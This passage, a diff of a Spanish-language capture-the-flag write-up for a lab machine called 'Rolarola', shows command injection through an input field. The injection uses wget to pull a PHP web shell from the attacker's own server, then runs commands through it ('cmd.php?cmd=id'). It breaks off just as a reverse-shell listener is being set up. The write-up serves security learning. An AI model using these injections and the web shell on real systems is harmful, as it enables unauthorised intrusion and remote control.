@@ -143,6 +143,60 @@ sudo python3 -m http.server 80
 
 
 
+4-hago una peticion con wget para alojar mi página:
+
+```bash
+nana&wget http://172.17.0.1/cmd.php
+```
+
+
+
+![imagen_CTF](images/Rolarola/16.png)
+
+
+
+Vemos como la solicita y recibe:
+
+![imagen_CTF](images/Rolarola/pide_archivo.png)
+
+
+
+
+5-Comprobamos que se ha alojado correctamente:
+
+```bash
+asd&ls
+````
+
+![imagen_CTF](images/Rolarola/17.png)
+
+
+
+
+![imagen_CTF](images/Rolarola/18.png)
+
+
+
+6-Vemos que se ha alojado, ahora vamos a nuestra página y comprobamos que funciona con un simple `id`
+
+URL-->`http://172.17.0.2/cmd.php?cmd=id`
+
+![imagen_CTF](images/Rolarola/18.png)
+
+
+7- lanzamos una reverse shell:
+
+nos pornemos en escucha en nuestra máquina atacante por el puerto 445:
+
+```bash
+
+
+
+
+
+
+
+
 
 
 
